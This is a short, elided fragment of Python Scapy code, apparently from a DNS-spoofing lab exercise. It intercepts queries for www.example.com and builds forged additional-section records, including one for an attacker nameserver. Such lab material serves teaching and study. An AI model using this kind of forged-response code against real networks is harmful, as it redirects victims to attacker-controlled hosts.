...
def spoof_dns(pkt):
  ...
  if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
    ...
    Addsec1 = DNSRR(rrname='ns.example.net', type='A',
                    ttl=259200, rdata='1.2.3.4')
    Addsec2 = DNSRR(rrname='ns.attacker32.com', type='A',
                    ttl=259200, rdata='5.6.6.7')
    Addsec3 = DNSRR(rrname='ns2.google.com', type='A',
                    ttl=259200, rdata='7.8.6.7')
